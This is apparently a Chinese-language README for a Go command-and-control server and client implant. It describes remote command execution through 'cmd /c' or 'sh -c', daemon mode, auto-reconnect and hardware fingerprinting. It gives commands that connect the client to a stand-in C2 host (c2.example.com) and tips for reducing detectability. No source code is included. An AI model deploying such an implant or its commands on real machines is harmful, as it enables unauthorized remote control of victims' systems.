"# C2 Server and Client Implementation

基于 Go 实现的 C2（Command and Control）服务器与客户端。

## 项目概述

该项目包含两个主要组件：

- **C2 服务器 (`server.go`)** - 管理连接的客户端并发送命令  
- **客户端 (`client.go`)** - 在目标机器上运行，连接服务器并执行命令

客户端会收集系统信息（如硬件指纹、IP 地址等）并连接至服务器，服务器操作员可以选择客户端并远程下发命令执行。

---

## 📁 目录结构

```
text
├── server.go       # C2 服务器源码
├── client.go       # 客户端源码
└── README.md       # 本说明文档
```

---

## ✨ 功能特性

### 服务器功能

- WebSocket 服务端监听客户端连接
- 客户端管理（UUID、IP 地址、连接状态）
- 交互式命令行界面
- 客户端选择与命令发送
- 实时显示客户端命令执行结果
- 多客户端并发管理

### 客户端功能

- 生成稳定的机器指纹（基于硬件信息）
- 获取公网 IPv4/IPv6 地址
- 守护进程模式（后台运行）
- 自动重连机制
- 心跳保持连接
- 命令执行与结果返回
- 跨平台支持（Windows/Linux/macOS）

---

## 🚀 使用指南

### 1. 编译程序

编译服务器：

```bash
go build -o c2-server server.go
```

编译客户端：

```bash
go build -o client client.go
```

---

### 2. 运行服务器

```bash
./c2-server -p 8080
```

- `-p`: 指定监听端口（默认：8080）

---

### 3. 运行客户端

```bash
./client -s wss://your-server-address:8080/ws -d
```

- `-s`: 服务器 WebSocket URL（支持 `ws://` 和 `wss://`）
- `-d`: 后台守护模式

> ⚠️ 客户端首次运行可能需要管理员/root 权限以获取硬件信息

---

## 🖥️ 服务器命令行操作

启动服务器后，会显示交互式 CLI：

```text
C2 Server CLI - Type 'help' for commands
> 
```

### 可用命令

| 命令              | 描述                       | 示例                                               |
|-------------------|----------------------------|----------------------------------------------------|
| `help`            | 显示帮助信息               | `help`                                             |
| `list`            | 列出所有在线客户端         | `list`                                             |
| `select [ID]`     | 选择客户端（编号或 UUID）  | `select 1` 或 `select 550e8400-e29b...`            |
| `cmd [command]`   | 向客户端发送命令           | `cmd whoami`                                       |
| `quit` / `exit`   | 关闭服务器                 | `quit`                                             |

---

### 客户端列表示例

```text
=== Online Clients ===
*  1. 550e8400... (IPv4: 192.168.1.100, IPv6: 2001:db8::1)
   2. 6ba7b810... (IPv4: 10.0.0.2, IPv6: ::)
```

`*` 表示当前选中的客户端

---

## 🔍 技术细节

### 客户端标识生成

使用以下硬件信息生成唯一 ID（通过 SHA-256 哈希并截断为 16 字符）：

- 主 MAC 地址  
- 系统磁盘序列号  
- BIOS/UEFI 序列号  
- 主板序列号

---

### 连接流程

1. 客户端启动并收集系统信息  
2. 连接至 WebSocket 服务器  
3. 发送 Base64 编码的系统信息  
4. 服务器注册客户端并显示在列表中  
5. 维持心跳连接（每 30 秒）

---

### 命令执行方式

- **Windows**: `cmd /c [command]`
- **Linux/macOS**: `sh -c [command]`

---

## 🔐 安全注意事项

- **通信安全**：
  - 推荐使用 TLS 加密（`wss://`）
  - 默认跳过证书验证，生产环境应配置合法证书

- **权限控制**：
  - 客户端可能需管理员/root 权限获取硬件信息
  - 服务器应部署在受控环境中

- **匿名性**：
  - 客户端使用 `ip.sb` 获取公网 IP
  - 使用标准 `curl` User-Agent 减少特征化

---

## 📦 依赖项

```bash
go get github.com/gorilla/websocket
```

---

## ⚠️ 已知限制

- Windows 可能需关闭防火墙以进行测试  
- 在虚拟机环境下可能无法完整获取硬件信息  
- IPv6 检测依赖网络支持  
- 命令输出受限于 WebSocket 消息大小

---

## ✅ 使用示例

启动服务器：

```bash
./c2-server -p 443
```

在客户端运行（后台模式）：

```bash
./client -s wss://c2.example.com/ws -d
```

服务器控制示例：

```text
> list
> select 1
> cmd uname -a
> cmd ipconfig /all
```

---

## 📄 许可证

此代码仅用于教育目的，**严禁用于未经授权的实际环境**。  
使用本项目造成的任何后果由使用者自行承担。
"